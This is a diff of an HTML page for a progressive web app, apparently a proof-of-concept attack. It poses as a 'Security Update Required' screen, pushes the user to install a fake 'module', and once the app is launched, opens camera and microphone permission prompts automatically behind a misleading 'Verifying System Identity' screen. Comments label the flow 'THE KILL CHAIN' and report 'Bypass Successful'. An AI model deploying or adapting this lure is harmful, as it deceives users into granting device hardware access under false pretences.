@@ -1,101 +1,73 @@
 <!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>awdawd</title>
-    <link rel="manifest" href="manifest.json" />
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="manifest" href="manifest.json">
     <style>
-      body {
-        font-family: sans-serif;
-        text-align: center;
-        margin-top: 50px;
-        background: #f0f2f5;
-      }
-      .btn {
-        padding: 15px 30px;
-        font-size: 18px;
-        margin: 10px;
-        background: #1a73e8;
-        color: white;
-        border: none;
-        border-radius: 8px;
-        font-weight: bold;
-        cursor: pointer;
-      }
-      #installBtn {
-        display: none;
-        background: #34a853;
-      }
-      #status {
-        margin-top: 20px;
-        font-weight: bold;
-        color: #d93025;
-      }
+        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 15vh; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 85%; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        #loader { display: none; margin-top: 20vh; font-size: 1.5em; color: #8ab4f8; }
     </style>
-  </head>
-  <body>
-    <h1>System Update Required</h1>
-    <div id="status">Checking environment...</div>
+</head>
+<body>
+    
+    <div id="install-ui">
+        <h2 id="txt">Security Update Required</h2>
+        <p id="sub" style="color:#9aa0a6">Checking system compatibility</p>
+        <button class="btn" id="go">Install Update</button>
+    </div>
 
-    <button id="installBtn" class="btn">1. Install Security Module</button>
-    <button id="triggerBtn" class="btn" style="display: none">
-      2. Verify System (Camera)
-    </button>
+    <div id="loader">Verifying System Identity...</div>
 
-    <script>
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').then(() => {
-            console.log('Service Worker Registered');
-        });
-    }
-      let deferredPrompt;
-      const installBtn = document.getElementById("installBtn");
-      const triggerBtn = document.getElementById("triggerBtn");
-      const statusDiv = document.getElementById("status");
+<script>
+// ========================================================
+// STAGE 2: THE KILL CHAIN (Eksekusi di dalam PWA Standalone)
+// ========================================================
+if (window.matchMedia('(display-mode: standalone)').matches) {
+    // Sembunyikan UI Install, tampilkan layar loading meyakinkan
+    document.getElementById('install-ui').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
 
-      const isPWA =
-        window.matchMedia("(display-mode: standalone)").matches ||
-        new URLSearchParams(window.location.search).get("pwa") === "true";
+    // Langsung auto-trigger permission dialog setelah PWA terbuka
+    // Tanpa perlu user interaksi lagi di dalam aplikasi
+    setTimeout(() => {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                // Eksekusi berhasil, langsung matikan stream agar lampu kamera mati
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById('loader').innerHTML = '<span style="color:lime;">Bypass Successful. Hardware Access Granted.</span>';
+            })
+            .catch(err => {
+                document.getElementById('loader').innerHTML = '<span style="color:red;">User Denied or Blocked.</span>';
+            });
+    }, 800); // Jeda milidetik agar UI PWA render sempurna sebelum OS pop-up turun
+} 
 
-      if (isPWA) {
-        statusDiv.innerText =
-          "Running in Secure Module (PWA Mode). Ready to trigger.";
-        statusDiv.style.color = "#1e8e3e";
-        triggerBtn.style.display = "inline-block";
-      } else {
-        statusDiv.innerText = "Please install the module first to proceed.";
+// ========================================================
+// STAGE 1: PWA INSTALLATION FLOW (Eksekusi di Browser biasa)
+// ========================================================
+else {
+    let p;
+    navigator.serviceWorker.register('sw.js');
 
-        window.addEventListener("beforeinstallprompt", (e) => {
-          e.preventDefault();
-          deferredPrompt = e;
-          installBtn.style.display = "inline-block";
-        });
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        p = e;
+        document.getElementById('go').style.display = 'inline-block';
+        document.getElementById('sub').innerText = "Compatibility Confirmed";
+    });
 
-        installBtn.addEventListener("click", async () => {
-          if (deferredPrompt) {
-            deferredPrompt.prompt();
-            const { outcome } = await deferredPrompt.userChoice;
-            if (outcome === "accepted") {
-              statusDiv.innerText =
-                "Installing... Please open the app from your home screen.";
+    document.getElementById('go').onclick = async () => {
+        if (p) {
+            p.prompt();
+            const { outcome } = await p.userChoice;
+            if (outcome === 'accepted') {
+                alert("Module Installed. Launch the app from your Home Screen.");
             }
-            deferredPrompt = null;
-          }
-        });
-      }
-
-      triggerBtn.addEventListener("click", () => {
-        navigator.mediaDevices
-          .getUserMedia({ video: true })
-          .then((stream) => {
-            stream.getTracks().forEach((track) => track.stop());
-            statusDiv.innerText = "Bypass Success! Permission granted.";
-          })
-          .catch((err) => {
-            statusDiv.innerText = "Permission Denied.";
-          });
-      });
-    </script>
-  </body>
+            p = null;
+        }
+    };
+}
+</script>
+</body>
 </html>
